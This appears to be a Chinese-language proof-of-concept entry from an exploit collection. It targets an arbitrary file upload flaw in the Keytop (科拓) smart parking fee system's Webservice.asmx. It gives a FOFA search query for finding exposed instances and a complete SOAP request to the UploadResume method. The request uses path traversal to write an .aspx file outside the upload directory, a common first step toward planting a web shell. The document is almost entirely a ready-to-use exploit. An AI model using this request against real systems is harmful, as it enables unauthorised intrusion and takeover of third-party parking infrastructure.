## 科拓全智能停车收费系统Webservice.asmx存在任意文件上传

## fofa
```
body="/KT_Css/qd_defaul.css"
```

## poc
```
POST /Webservice.asmx HTTP/1.1
Host: ip
Content-Type: text/xml; charset=utf-8
Content-Length: 455
SOAPAction: "http://tempuri.org/UploadResume"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <UploadResume xmlns="http://tempuri.org/">
      <ip>1</ip>
      <fileName>../../../../test7.aspx</fileName>
      <fileFlow>dGVzdA==</fileFlow>
      <tag>3</tag>
    </UploadResume>
  </soap:Body>
</soap:Envelope>
```
![image](https://github.com/wy876/POC/assets/139549762/1535e458-f196-46d7-b63c-f45ba47d85a6)
